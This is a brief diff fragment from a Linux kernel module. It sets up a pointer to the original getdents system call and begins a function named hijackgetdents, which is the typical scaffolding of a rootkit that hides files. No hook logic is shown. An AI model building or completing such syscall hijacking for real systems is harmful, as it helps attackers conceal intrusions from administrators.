@@ -12,8 +12,9 @@ MODULE_VERSION("0.1");
 
 #define SYS_CALL_TABLE "sys_call_table"
 
+extern void* syscall_table[];
 
-static void *original_syscall = NULL;
+static void *originalGetDents = NULL;
 
 static asmlinkage long hijackgetdents(void){
 
